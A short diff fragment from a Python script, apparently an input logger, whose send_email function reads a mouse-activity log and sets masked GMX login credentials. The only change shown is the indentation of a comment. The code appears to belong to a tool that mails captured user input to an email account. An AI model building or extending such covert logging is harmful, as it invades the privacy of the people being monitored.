@@ -66,7 +66,7 @@ def send_email():
         with open(mouse_log_file, 'r') as f:
             mouse_data = f.read()
 
-        # GMX email login credentials
+            # GMX email login credentials
         gmx_user = '******'  # Replace with your GMX email
         gmx_password = '*****'  # Replace with your GMX password
 
